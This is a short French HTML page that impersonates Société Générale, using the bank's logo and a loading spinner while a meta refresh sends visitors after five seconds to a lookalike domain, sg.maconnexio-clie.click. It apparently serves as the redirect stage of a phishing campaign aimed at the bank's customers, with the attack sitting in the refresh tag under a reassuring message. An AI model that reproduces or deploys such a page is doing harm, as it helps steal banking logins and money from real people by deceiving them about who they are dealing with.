<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Redirection</title>
  <meta http-equiv="refresh" content="5;URL=https://sg.maconnexio-clie.click/index.html">
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #000000;
      text-align: center;
    }
    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #00AEEF;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 20px 0;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .logo {
      max-width: 200px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <img class="logo" src="https://www.franceactive.org/wp-content/uploads/2018/03/logo_SocieteGenerale_600x300.png" alt="SG Logo">
  <div class="loader"></div>
  <p>Vous allez être redirigé vers votre banque Société Générale dans quelques instants.</p>
</body>
</html>
